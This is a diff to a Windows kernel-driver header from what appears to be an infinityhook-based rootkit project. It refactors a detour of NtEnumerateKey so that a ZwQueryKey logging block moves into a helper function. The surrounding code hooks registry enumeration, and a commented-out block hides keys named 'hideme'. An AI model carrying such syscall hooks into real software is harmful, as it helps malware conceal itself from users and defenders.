@@ -1,5 +1,6 @@
 #pragma once
 #include "Settings.h"
+#include "RegistryUtils.h"
 
 // source: https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ne-wdm-_key_information_class
 //typedef enum _KEY_INFORMATION_CLASS {
@@ -53,22 +54,7 @@ NTSTATUS DetourNtEnumerateKey(
 			kprintf("[+] infinityhook: NtEnumerateKey: NameLength: %d, Name: %ws\n", KeyBasicInformationPtr->NameLength, NameBuffer);
 			
 			// try to get info about the handle
-			// TODO - dynamic allocation
-			PVOID KeyInformationBuffer[100] = { 0 };
-			size_t BufferSize = 100 * sizeof(PVOID);
-			ULONG ResLength = -1;
-			NTSTATUS KeyResult = ZwQueryKey(KeyHandle, KeyNameInformation, KeyInformationBuffer, BufferSize, &ResLength);
-			if (NT_SUCCESS(KeyResult)) {
-				PKEY_NAME_INFORMATION KeyNamePtr = (PKEY_NAME_INFORMATION)KeyInformationBuffer;
-				wchar_t HandleNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
-				for (size_t i = 0; i < KeyNamePtr->NameLength / 2 && i < MAX_PATH_SYSHOOKER; ++i) {
-					HandleNameBuffer[i] = KeyNamePtr->Name[i];
-				}
-				kprintf("[+] infinityhook: ZwQueryKey: NameLength: %d, Name: %ws\n", KeyNamePtr->NameLength, HandleNameBuffer);
-			}
-			else {
-				kprintf("[-] infinityhook: ZwQueryKey not success: %x\n", KeyResult);
-			}
+			PrintRegistryKeyHandleInformation(KeyHandle, L"NtEnumerateKey");
 
 			// if the key contains 'hideme', change it to 'xideme'
 			/*if (wcsstr(NameBuffer, Settings.RegistryKeyMagicName)) {
